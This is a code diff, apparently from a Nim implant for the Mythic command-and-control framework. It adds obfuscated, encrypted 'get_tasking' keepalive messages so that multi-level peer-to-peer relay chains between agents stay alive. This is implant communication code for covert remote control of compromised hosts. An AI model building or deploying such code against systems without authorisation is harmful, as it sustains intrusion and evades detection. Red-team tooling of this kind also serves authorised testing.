@@ -605,6 +605,17 @@ proc start*(profile: TcpProfile) {.async.} =
                   debug "[DEBUG] TCP P2P: Sending ", noChunkDelegates.len, " downstream delegate(s) (no chunks)"
                 let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
                 await sendChunkedMessage(client, responseEncrypted)
+              else:
+                # Always respond to keep the relay chain alive (multi-level P2P)
+                # Without this, the parent agent never gets data from us, Mythic never
+                # sends new delegates, and downstream responses get stuck permanently
+                let getTaskingMsg = %* {
+                  obf("action"): obf("get_tasking"),
+                  obf("tasking_size"): -1
+                }
+                debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no chunks, no downstream data)"
+                let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
+                await sendChunkedMessage(client, responseEncrypted)
               continue
             
             # Check for action field
@@ -833,6 +844,15 @@ proc start*(profile: TcpProfile) {.async.} =
                       delegateResponse[obf("delegates")] = noTaskDelegates
                       debug "[DEBUG] TCP P2P: Sending ", noTaskDelegates.len, " downstream delegate(s) (no tasks)"
                     let responseEncrypted = profile.encryptMessage($delegateResponse, profile.callbackUuid)
+                    await sendChunkedMessage(client, responseEncrypted)
+                  else:
+                    # Always respond to keep the relay chain alive (multi-level P2P)
+                    let getTaskingMsg = %* {
+                      obf("action"): obf("get_tasking"),
+                      obf("tasking_size"): -1
+                    }
+                    debug "[DEBUG] TCP P2P: Sending get_tasking keepalive (no tasks, no downstream data)"
+                    let responseEncrypted = profile.encryptMessage($getTaskingMsg, profile.callbackUuid)
                     await sendChunkedMessage(client, responseEncrypted)
                   continue
           except:
